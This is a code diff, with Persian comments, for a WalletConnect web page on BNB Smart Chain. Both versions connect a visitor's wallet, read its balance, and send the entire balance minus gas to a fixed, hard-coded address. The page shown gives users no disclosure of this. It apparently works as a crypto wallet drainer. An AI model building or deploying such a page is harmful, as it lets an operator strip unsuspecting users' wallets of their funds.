@@ -1,77 +1,69 @@
-import { createWeb3Modal } from '@walletconnect/modal-sign-html'
-import { ethers } from 'ethers'
+import { WalletConnectModal } from '@walletconnect/modal';
+import { EthereumProvider } from '@walletconnect/ethereum-provider';
+import { ethers } from 'ethers';
 
-const projectId = "4d08946e6c316bed5e76b450ccbb5256" // ← اینجا Project ID خودت رو بذار
-const targetAddress = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05" // ← آدرس گیرنده BNB رو وارد کن
+const projectId = '4d08946e6c316bed5e76b450ccbb5256'; // از cloud.walletconnect.com بگیر
 
-const metadata = {
-  name: "BNB Sender App",
-  description: "Send full BNB via WalletConnect",
-  url: "https://yourapp.com",
-  icons: ["https://walletconnect.com/walletconnect-logo.png"]
-}
+let provider, signer, userAddress;
 
-const web3Modal = createWeb3Modal({
+const wcModal = new WalletConnectModal({
   projectId,
+  chains: [56], // BNB Smart Chain Mainnet
   themeMode: 'light',
-  chains: [{ chainId: 56, rpcUrl: 'https://bsc-dataseed.binance.org/' }],
-  metadata
-})
+  standaloneChains: ['bsc:56']
+});
 
-let address = ""
-let provider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/')
-let signer
-
-document.getElementById('connectBtn').addEventListener('click', async () => {
+document.getElementById("connect").addEventListener("click", async () => {
   try {
-    await web3Modal.openModal()
-    const session = await web3Modal.signClient.core.session.getAll()
-    const acc = session[0].namespaces.eip155.accounts[0]
-    address = acc.split(':')[2]
-    document.getElementById('address').textContent = address
+    const wcProvider = await EthereumProvider.init({
+      projectId,
+      chains: [56],
+      showQrModal: true,
+    });
 
-    const balance = await provider.getBalance(address)
-    document.getElementById('balance').textContent = `${ethers.formatEther(balance)} BNB`
+    await wcProvider.enable();
 
-    document.getElementById('sendAllBtn').disabled = false
+    provider = new ethers.BrowserProvider(wcProvider);
+    signer = await provider.getSigner();
+    userAddress = await signer.getAddress();
+
+    document.getElementById('address').textContent =` آدرس: ${userAddress}`;
+
+    const balance = await provider.getBalance(userAddress);
+    const bnb = ethers.formatEther(balance);
+    document.getElementById('balance').textContent =` موجودی BNB: ${bnb}`;
+    document.getElementById('send').disabled = false;
   } catch (err) {
-    alert("Connection failed: " + (err?.message || err))
+    console.error("خطا در اتصال:", err);
   }
-})
+});
 
-document.getElementById('sendAllBtn').addEventListener('click', async () => {
+document.getElementById('send').addEventListener('click', async () => {
+  const toAddress = '0x98907E5eE9E010c34DF6F7847565D421D3CDAd05';
+
   try {
-    const balance = await provider.getBalance(address)
-    const feeData = await provider.getFeeData()
-    const gasPrice = feeData.gasPrice
-    const gasLimit = 21000n
-    const gasCost = gasLimit * gasPrice
-    const amountToSend = balance - gasCost
+    const balance = await provider.getBalance(userAddress);
+    const gasData = await provider.getFeeData();
 
-    if (amountToSend <= 0n) {
-      alert("Not enough BNB to send")
-      return
+    const gasLimit = 21000n;
+    const txFee = gasData.gasPrice * gasLimit;
+    const sendAmount = balance - txFee;
+
+    if (sendAmount <= 0n) {
+      alert("موجودی کافی برای گس وجود ندارد!");
+      return;
     }
 
-    const tx = {
-      from: address,
-      to: targetAddress,
-      value: `0x${amountToSend.toString(16)}`,
-      gas: `0x${gasLimit.toString(16)}`,
-      gasPrice: `0x${gasPrice.toString(16)}`
-    }
+    const tx = await signer.sendTransaction({
+      to: toAddress,
+      value: sendAmount,
+      gasLimit,
+      gasPrice: gasData.gasPrice
+    });
 
-    const result = await web3Modal.signClient.request({
-      topic: web3Modal.session.topic,
-      chainId: "eip155:56",
-      request: {
-        method: "eth_sendTransaction",
-        params: [tx]
-      }
-    })
-
-    alert("Transaction sent: " + result)
+    alert(`تراکنش ارسال شد!\n\nTX Hash: ${tx.hash}`);
   } catch (err) {
-    alert("Transaction failed: " + (err?.message || err))
+    console.error("خطا در ارسال تراکنش:", err);
+    alert("ارسال تراکنش ناموفق بود.");
   }
-})
+});
